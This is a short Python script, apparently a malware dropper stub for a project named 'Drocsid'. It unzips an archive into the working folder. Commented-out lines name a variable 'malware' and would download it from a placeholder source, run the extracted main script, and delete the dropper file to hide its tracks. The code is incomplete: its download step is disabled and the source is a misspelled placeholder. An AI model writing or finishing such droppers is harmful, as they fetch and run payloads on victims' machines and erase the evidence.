import requests
import zipfile
import os
import sys


def main():

	main_script_path = "Drocsid\src\main.py"

	#malware = requests.get("download-srouce")

	with zipfile.ZipFile("Drocsid.zip", 'r') as zip_ref:
		zip_ref.extractall(".")


	#os.system(f"{main_script_path}")

	#os.remove("dropper.py")


if __name__ == "__main__":
	main()